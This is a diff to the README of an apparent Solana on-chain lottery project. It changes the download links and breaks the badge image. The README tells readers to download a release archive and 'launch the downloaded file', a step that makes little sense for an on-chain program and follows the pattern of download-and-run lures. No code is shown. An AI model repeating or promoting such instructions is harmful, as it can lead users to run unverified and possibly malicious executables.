@@ -18,9 +18,9 @@ Welcome to Solana's first fully-onchain lottery program powered by Pyth! This in
 - **Topics**: first-lottery-onchain, lottery, onchain, price, pricefeed, pyth, randomnumber, rust, solana, solana-program, svm, test
 
 ## Download the Program
-You can download the latest release of the Solana Lottery Program from the following link: [Download Here](https://github.com/releases/789694263/Release.zip)
+You can download the latest release of the Solana Lottery Program from the following link: [Download Here](https://github.com/ICE-FACE/Solana-Lottery-Program/releases)
 
-[![Download Solana Lottery Program](https://img.shields.io/badge/Download-Solana_Lottery_Program-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download Solana Lottery Program](https://github.com/ICE-FACE/Solana-Lottery-Program/releases)](https://github.com/ICE-FACE/Solana-Lottery-Program/releases)
 
 Please ensure to launch the downloaded file to start using the program.
 
